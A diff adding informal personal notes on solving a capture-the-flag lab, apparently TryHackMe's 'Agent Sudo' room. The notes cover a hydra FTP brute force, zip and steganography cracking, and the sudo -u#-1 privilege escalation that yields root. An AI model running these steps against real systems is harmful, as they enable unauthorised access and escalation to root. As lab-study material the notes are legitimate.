@@ -1,0 +1,63 @@
+date:1/march/2021
+time:13:11
+
+curl 10.10.132.199 -A C -L
+got agent name chris
+
+hydra -l chris -P /usr/share/wordlists/rock.txt 10.10.132.199 ftp
+got passwd crystal
+
+login through  ftp 
+ftp 10.10.132.199
+
+get all three files
+run:get<filename>
+
+run:binwalk -e  cutie.png
+got folder 
+cd to that folder
+
+run:zip2john 8702.zip > hash
+
+run:sudo john hash --wordlist=/usr/share/wordlists/rockyou.txt
+run:sudo john hash --show
+
+open file 8720.zip 
+passwd:alien
+got this QXJlYTUx
+in firefox search cyberchef
+past QXJlYTUx 
+in that search for magic[top left corner]
+u'll get Area51
+
+run:steghide extract -sf cute-alien.jpg
+passwd:Area51
+cat message.txt
+
+login using ssh
+username and passwd are in message.txt
+get user flag 
+
+for next flag[Alien_autospy.jpg] 
+run:scp[i dono what it is]
+
+come out of ssh
+run:scp james@10.10.132.199:/home/james/Alien_autospy.jpg /home/liki//Downloads/tryhackme/agent_sudo
+passwd:hackerrules!
+u get an image 
+upload  image  in google 
+u'll get roswell 
+
+
+for cve flag
+run:sudo -l
+search '(ALL, !root) /bin/bash exploit'  you know where 
+u get cve ans 
+on bottom u get sudo -u#-1 
+
+now for root flag 
+run:sudo -u#-1 bash[in ssh]
+cd /root
+u get root flag
+
+for last flag look root.txt
